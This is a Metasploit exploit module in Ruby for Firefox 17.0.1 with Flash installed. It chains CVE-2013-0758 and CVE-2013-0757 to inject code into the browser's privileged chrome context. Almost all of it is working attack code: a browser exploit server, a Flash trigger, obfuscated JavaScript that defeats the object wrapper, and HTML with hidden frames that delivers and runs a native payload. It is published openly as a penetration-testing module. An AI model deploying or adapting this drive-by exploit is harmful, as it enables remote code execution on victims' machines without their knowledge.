# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::BrowserExploitServer
  include Msf::Exploit::EXE
  # include Msf::Exploit::Remote::BrowserAutopwn
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
  # autopwn_info({
  #   :ua_name    => HttpClients::FF,
  #   :ua_minver  => "17.0",
  #   :ua_maxver  => "17.0.1",
  #   :javascript => true,
  #   :rank       => NormalRanking
  # })
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Firefox 17.0.1 Flash Privileged Code Injection&#039;,
      &#039;Description&#039;    => %q{
        This exploit gains remote code execution on Firefox 17 and 17.0.1, provided
        the user has installed Flash. No memory corruption is used.
        First, a Flash object is cloned into the anonymous content of the SVG
        "use" element in the <body> (CVE-2013-0758). From there, the Flash object
        can navigate a child frame to a URL in the chrome:// scheme.
        Then a separate exploit (CVE-2013-0757) is used to bypass the security wrapper
        around the child frame&#039;s window reference and inject code into the chrome://
        context. Once we have injection into the chrome execution context, we can write
        the payload to disk, chmod it (if posix), and then execute.
        Note: Flash is used here to trigger the exploit but any Firefox plugin
        with script access should be able to trigger it.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Targets&#039; => [
        [
          &#039;Universal (Javascript XPCOM Shell)&#039;, {
            &#039;Platform&#039; => &#039;firefox&#039;,
            &#039;Arch&#039; => ARCH_FIREFOX
          }
        ],
        [
          &#039;Native Payload&#039;, {
            &#039;Platform&#039; => %w{ java linux osx solaris win },
            &#039;Arch&#039;     => ARCH_ALL
          }
        ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;Author&#039;         =>
        [
          &#039;Marius Mlynski&#039;, # discovery & bug report
          &#039;joev&#039;,           # metasploit module
          &#039;sinn3r&#039;          # metasploit fu
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-0758&#039;],  # navigate a frame to a chrome:// URL
          [&#039;CVE&#039;, &#039;2013-0757&#039;],  # bypass Chrome Object Wrapper to talk to chrome://
          [&#039;OSVDB&#039;, &#039;89019&#039;],  # maps to CVE 2013-0757
          [&#039;OSVDB&#039;, &#039;89020&#039;],  # maps to CVE 2013-0758
          [&#039;URL&#039;, &#039;http://www.mozilla.org/security/announce/2013/mfsa2013-15.html&#039;],
          [&#039;URL&#039;, &#039;https://bugzilla.mozilla.org/show_bug.cgi?id=813906&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Jan 08 2013&#039;,
      &#039;BrowserRequirements&#039; => {
        :source  => &#039;script&#039;,
        :ua_name => HttpClients::FF,
        :ua_ver  => /17\..*/,
        :flash   => /[\d.]+/
      }
    ))
 
    register_options(
      [
        OptString.new(&#039;CONTENT&#039;, [ false, "Content to display inside the HTML <body>.", &#039;&#039; ] ),
        OptBool.new(&#039;DEBUG_JS&#039;, [false, "Display some alert()&#039;s for debugging the payload.", false])
      ], Auxiliary::Timed)
 
  end
 
  def on_request_exploit(cli, request, info)
    if request.uri =~ /\.swf$/
      # send Flash .swf for navigating the frame to chrome://
      print_status("Sending .swf trigger.")
      send_response(cli, flash_trigger, { &#039;Content-Type&#039; => &#039;application/x-shockwave-flash&#039; })
    else
      # send initial HTML page
      print_status("Target selected: #{target.name}")
      print_status("Sending #{self.name}")
      send_response_html(cli, generate_html(cli, target))
    end
  end
 
  # @return [String] the contents of the .swf file used to trigger the exploit
  def flash_trigger
    swf_path = File.join(Msf::Config.data_directory, "exploits", "cve-2013-0758.swf")
    @flash_trigger ||= File.read(swf_path)
  end
 
  # @return [String] containing javascript that will alert a debug string
  #   if the DEBUG is set to true
  def js_debug(str, quote="&#039;")
    if datastore[&#039;DEBUG_JS&#039;] then "alert(#{quote}#{str}#{quote})" else &#039;&#039; end
  end
 
  # @return [String] HTML that is sent in the first response to the client
  def generate_html(cli, target)
    vars = {
      :symbol_id        => &#039;a&#039;,
      :random_domain    => &#039;safe&#039;,
      :payload          => run_payload, # defined in FirefoxPrivilegeEscalation mixin
      :payload_var      => &#039;c&#039;,
      :payload_key      => &#039;k&#039;,
      :payload_obj_var  => &#039;payload_obj&#039;,
      :interval_var     => &#039;itvl&#039;,
      :access_string    => &#039;access&#039;,
      :frame_ref        => &#039;frames[0]&#039;,
      :frame_name       => &#039;n&#039;,
      :loader_path      => "#{get_module_uri}.swf",
      :content          => self.datastore[&#039;CONTENT&#039;] || &#039;&#039;
    }
    script = js_obfuscate %Q|
      var #{vars[:payload_obj_var]} = #{JSON.unparse({vars[:payload_key] => vars[:payload]})};
      var #{vars[:payload_var]} = #{vars[:payload_obj_var]}[&#039;#{vars[:payload_key]}&#039;];
      function $() {
        document.querySelector(&#039;base&#039;).href = "http://www.#{vars[:random_domain]}.com/";
      }
      function _() {
        return &#039;#{vars[:frame_name]}&#039;;
      }
      var #{vars[:interval_var]} = setInterval(function(){
        try{ #{vars[:frame_ref]}[&#039;#{vars[:access_string]}&#039;] }
        catch(e){
          clearInterval(#{vars[:interval_var]});
          var p = Object.getPrototypeOf(#{vars[:frame_ref]});
          var o = {__exposedProps__: {setTimeout: "rw", call: "rw"}};
          Object.prototype.__lookupSetter__("__proto__").call(p, o);
          p.setTimeout.call(#{vars[:frame_ref]}, #{vars[:payload_var]}, 1);
        }
      }, 100);
      document.querySelector(&#039;object&#039;).data = "#{vars[:loader_path]}";
      document.querySelector(&#039;use&#039;).setAttributeNS(
        "http://www.w3.org/1999/xlink", "href", location.href + "##{vars[:symbol_id]}"
      );
    |
 
    %Q|
      <!doctype html>
      <html>
      <head>
        <base href="chrome://browser/content/">
      </head>
      <body>
      <svg style=&#039;position: absolute;top:-500px;left:-500px;width:1px;height:1px&#039;>
        <symbol id="#{vars[:symbol_id]}">
          <foreignObject>
            <object></object>
          </foreignObject>
        </symbol>
        <use />
      </svg>
      <script>
      #{script}
      </script>
      <iframe style="position:absolute;top:-500px;left:-500px;width:1px;height:1px"
        name="#{vars[:frame_name]}"></iframe>
      #{vars[:content]}
      </body>
      </html>
      |
  end
end

